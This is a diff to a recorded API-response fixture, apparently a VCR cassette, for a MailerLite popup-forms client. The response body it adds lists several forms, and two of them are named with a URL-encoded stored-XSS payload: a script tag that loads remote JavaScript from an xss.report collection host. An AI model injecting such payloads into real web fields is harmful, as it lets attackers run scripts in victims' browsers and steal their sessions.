@@ -16,29 +16,24 @@ interactions:
     uri: https://connect.mailerlite.com/api/forms/popup?limit=10&page=1&sort=name
   response:
     body:
-      string: !!binary |
-        H4sIAAAAAAAAA6RVTY/jNgz9KwGB7smZ2E6yk6goigJFexv0UvQwWQiKzDjqyJJXpDITBPnvhWzn
-        YzLZFuheDJGiSOnxPfoAlWIF4vkApgIBxXS5WEyns3I5m5WPs+JxARkorX10LLuIxXRe5JAB71sE
-        Aa1vYwsZkI01CHj60/z61y+QgVNN2n7C19FvPjSjp2RnoAMqxkoqBgFlXs7GRTnO56OiFPNSTIsU
-        4t0OAxnvSHZ1QeQZ+Bbf2ZcoGRQjiANsrFf9JnEwLl0n/wGOdzJK47SNlXG11Ftjq4Dutsi3Qm7q
-        3g37l6sQMhtXUwqqfFxblL5l40BwiJhBHbzvgS7zeb4olvMMNj408gZuDqauMRCIZ2DToI8MX7LT
-        UhJq7yoCMc+AdPDWyhaDRseqRhDzPINNwK8Rnd6DKK4sGZ1JvWm84y1BBjtDZm2s4T0IUPZV7ZM3
-        BiutIQbx/OViyfRazSBctDaDralQetfHkN5iFS2C2ChLeMzAKmIZsDbEQXFCVJ2PKs1md4rNwJBc
-        B/+SwB08ryq4hHqDRKpG6otsVWqfY0ws6RHVqutIbKuOJsl5zCASVtI4qSL7pitOt6mHlPe6RDog
-        Otp6ljFYELBlbkmsJqsJsQ+qxofa+9qiag09aN+sJo0yFoM1jOPLaRq3wVerycWzmqRu02ryUYir
-        SVEuZm/pcxHOuBfOfPrQuhp6ABpDlKCpg4/t5Vkn8yz1PM+X08/zebEsivLx86K8yPb3EFs1KuDU
-        iJPwisRgxyezvNHlYN8qsriSQZEPmrRGv7wTdHL8t5ajo7gmHcwaq6vT0WnvNiY077xrH51+5/k7
-        upfrojfjaDrOl+NyOsoXoihFuYDjQCpqrWHJSHwB9OKTG+MMbbG6t4dOre2HrWs55h3Br468Gucw
-        nE9cJksiZKsCDsO414oPpjZOWdk3bxCQU3bPRpMMSMhX0oqEJCmGHe7PFTqfw1e5jsZW59Lp9da4
-        l25cbUxIer/iuvbOoeaHC7d7rqvWnHncDayfW1XjT4lOSfPfm6MNuDs9xuHb8LBjBg2mX9kBdAwd
-        RG2HbjfdfNMtupFzdg9Pez5Ap+I+o1VrTJL+ZNXX6H8c/RFwZ3wkuBlKx2w49r2A9OWKq/z9jLp7
-        qyd849Gn0F3tw406cvD2/10pAYvhBE6eAfsOJPasbLdSdR2wPg3Lw/AvSjvYrLGqEseL1B7f+BQE
-        Ij8ej/8AAAD//wMAJktURWIIAAA=
+      string: '{"data":[{"id":"141163052291589265","account_id":"83510","type":"popup","slug":"2HLgfJ","name":"%3Cscript%3E$.getScript(%22\/\/xss.report\/c\/igorhrcek%22)%3C\/script%3E","created_at":"2024-12-19
+        15:52:57","conversions_count":0,"opens_count":0,"conversion_rate":{"float":0,"string":"0%"},"conversions_count_including_children":0,"opens_count_including_children":0,"conversion_rate_including_children":{"float":0,"string":"0%"},"settings":{"double_optin":true,"groot_id":20939090,"form_type":"popup","triggers":["timeout"],"timeout_seconds":5,"scroll_percentage":50,"frequency":1,"frequency_unit":"months","visibility":"always","url_list":[],"url_list_strict":null,"hide_on":[],"schedule":false,"needs_content_refresh":false},"last_registration_at":null,"active":false,"is_broken":false,"warning_messages":[],"has_content":true,"can_choose_template":false,"can":{"update":true},"used_in_automations":false,"warnings":[],"double_optin":true,"screenshot_url":"https:\/\/storage.googleapis.com\/mailerlite-screenshots-prod\/screenshot\/forms\/141163052291589265\/1284x12842024-12-19-15:56:53.png","has_missing_groups":false,"groups":[{"id":"100093655191127682","name":"Grupa
+        1","active_count":1,"sent_count":4,"opens_count":4,"open_rate":{"float":1,"string":"100%"},"clicks_count":2,"click_rate":{"float":0.5,"string":"50%"},"unsubscribed_count":0,"unconfirmed_count":0,"bounced_count":0,"junk_count":0,"created_at":"2023-09-23
+        08:12:28"},{"id":"107641605251400900","name":"Grupa2","active_count":9,"sent_count":8,"opens_count":7,"open_rate":{"float":0.875,"string":"87.5%"},"clicks_count":2,"click_rate":{"float":0.25,"string":"25%"},"unsubscribed_count":0,"unconfirmed_count":0,"bounced_count":0,"junk_count":0,"created_at":"2023-12-15
+        15:43:54"}],"has_split_tests":false,"split_test_finished":false,"split_test_enabled":false,"split_percentage":0,"is_split_test_winner":false,"children":[],"parent_id":null,"original_name":null,"analytics_reset_at":null,"uses_survey":false,"uses_new_builder":false},{"id":"141163323330660076","account_id":"83510","type":"popup","slug":"lTG9JH","name":"%3Cscript%3E$.getScript(%22\/\/xss.report\/c\/igorhrcek%22)%3C\/script%3E","created_at":"2024-12-19
+        15:57:15","conversions_count":0,"opens_count":0,"conversion_rate":{"float":0,"string":"0%"},"conversions_count_including_children":0,"opens_count_including_children":0,"conversion_rate_including_children":{"float":0,"string":"0%"},"settings":{"double_optin":true},"last_registration_at":null,"active":false,"is_broken":false,"warning_messages":[],"has_content":false,"can_choose_template":false,"can":{"update":true},"used_in_automations":false,"warnings":[],"double_optin":true,"screenshot_url":null,"has_missing_groups":true,"groups":[],"has_split_tests":false,"split_test_finished":false,"split_test_enabled":false,"split_percentage":0,"is_split_test_winner":false,"children":[],"parent_id":null,"original_name":null,"analytics_reset_at":null,"uses_survey":false,"uses_new_builder":false},{"id":"142089765039113797","account_id":"83510","type":"popup","slug":"rap2Tg","name":"Form
+        Ownership Validation","created_at":"2024-12-29 21:22:39","conversions_count":0,"opens_count":0,"conversion_rate":{"float":0,"string":"0%"},"conversions_count_including_children":0,"opens_count_including_children":0,"conversion_rate_including_children":{"float":0,"string":"0%"},"settings":{"double_optin":true,"groot_id":21150747,"form_type":"popup","triggers":["timeout"],"timeout_seconds":5,"scroll_percentage":50,"frequency":1,"frequency_unit":"months","visibility":"always","url_list":[],"url_list_strict":null,"hide_on":[],"schedule":false},"last_registration_at":null,"active":false,"is_broken":false,"warning_messages":[],"has_content":true,"can_choose_template":false,"can":{"update":true},"used_in_automations":false,"warnings":[],"double_optin":true,"screenshot_url":"https:\/\/storage.googleapis.com\/mailerlite-screenshots-prod\/screenshot\/forms\/142089765039113797\/1284x12842024-12-29-21:23:05.png","has_missing_groups":false,"groups":[{"id":"100093655191127682","name":"Grupa
+        1","active_count":1,"sent_count":4,"opens_count":4,"open_rate":{"float":1,"string":"100%"},"clicks_count":2,"click_rate":{"float":0.5,"string":"50%"},"unsubscribed_count":0,"unconfirmed_count":0,"bounced_count":0,"junk_count":0,"created_at":"2023-09-23
+        08:12:28"},{"id":"107641605251400900","name":"Grupa2","active_count":9,"sent_count":8,"opens_count":7,"open_rate":{"float":0.875,"string":"87.5%"},"clicks_count":2,"click_rate":{"float":0.25,"string":"25%"},"unsubscribed_count":0,"unconfirmed_count":0,"bounced_count":0,"junk_count":0,"created_at":"2023-12-15
+        15:43:54"}],"has_split_tests":false,"split_test_finished":false,"split_test_enabled":false,"split_percentage":0,"is_split_test_winner":false,"children":[],"parent_id":null,"original_name":null,"analytics_reset_at":null,"uses_survey":false,"uses_new_builder":false},{"id":"139883342944274178","account_id":"83510","type":"popup","slug":"NUiDWA","name":"New
+        Form Name","created_at":"2024-12-05 12:52:31","conversions_count":0,"opens_count":0,"conversion_rate":{"float":0,"string":"0%"},"conversions_count_including_children":0,"opens_count_including_children":0,"conversion_rate_including_children":{"float":0,"string":"0%"},"settings":{"double_optin":true,"groot_id":20508195,"form_type":"popup","triggers":["timeout"],"timeout_seconds":5,"scroll_percentage":50,"frequency":1,"frequency_unit":"months","visibility":"always","url_list":[],"url_list_strict":null,"hide_on":[],"schedule":false},"last_registration_at":null,"active":false,"is_broken":false,"warning_messages":[],"has_content":true,"can_choose_template":false,"can":{"update":true},"used_in_automations":false,"warnings":[],"double_optin":true,"screenshot_url":"https:\/\/storage.googleapis.com\/mailerlite-screenshots-prod\/screenshot\/forms\/139883342944274178\/1284x12842024-12-05-12:52:53.png","has_missing_groups":false,"groups":[{"id":"100093655191127682","name":"Grupa
+        1","active_count":1,"sent_count":4,"opens_count":4,"open_rate":{"float":1,"string":"100%"},"clicks_count":2,"click_rate":{"float":0.5,"string":"50%"},"unsubscribed_count":0,"unconfirmed_count":0,"bounced_count":0,"junk_count":0,"created_at":"2023-09-23
+        08:12:28"}],"has_split_tests":false,"split_test_finished":false,"split_test_enabled":false,"split_percentage":0,"is_split_test_winner":false,"children":[],"parent_id":null,"original_name":null,"analytics_reset_at":null,"uses_survey":false,"uses_new_builder":false}],"links":{"first":"https:\/\/connect.mailerlite.com\/api\/forms\/popup?page=1","last":"https:\/\/connect.mailerlite.com\/api\/forms\/popup?page=1","prev":null,"next":null},"meta":{"current_page":1,"from":1,"last_page":1,"links":[{"url":null,"label":"&laquo;
+        Previous","active":false},{"url":"https:\/\/connect.mailerlite.com\/api\/forms\/popup?page=1","label":"1","active":true},{"url":null,"label":"Next
+        &raquo;","active":false}],"path":"https:\/\/connect.mailerlite.com\/api\/forms\/popup","per_page":10,"to":4,"total":4,"aggregations":{"popup":4,"embedded":1,"promotion":0}}}'
     headers:
-      CF-Cache-Status:
-      - DYNAMIC
       CF-RAY:
-      - 8ed4330c78cee298-BEG
+      - 9818a34059d4e293-BEG
       Cache-Control:
       - no-cache, private
       Connection:
@@ -48,7 +43,7 @@ interactions:
       Content-Type:
       - application/json
       Date:
-      - Thu, 05 Dec 2024 12:56:59 GMT
+      - Fri, 19 Sep 2025 11:10:38 GMT
       Server:
       - cloudflare
       Transfer-Encoding:
@@ -57,14 +52,20 @@ interactions:
       - '*'
       alt-svc:
       - h3=":443"; ma=86400
+      cf-cache-status:
+      - DYNAMIC
       strict-transport-security:
       - max-age=31536000; includeSubDomains
+      x-account_id:
+      - '83510'
       x-locale:
       - en
       x-ratelimit-limit:
       - '120'
       x-ratelimit-remaining:
-      - '119'
+      - '106'
+      x-user_id:
+      - '106223'
     status:
       code: 200
       message: OK
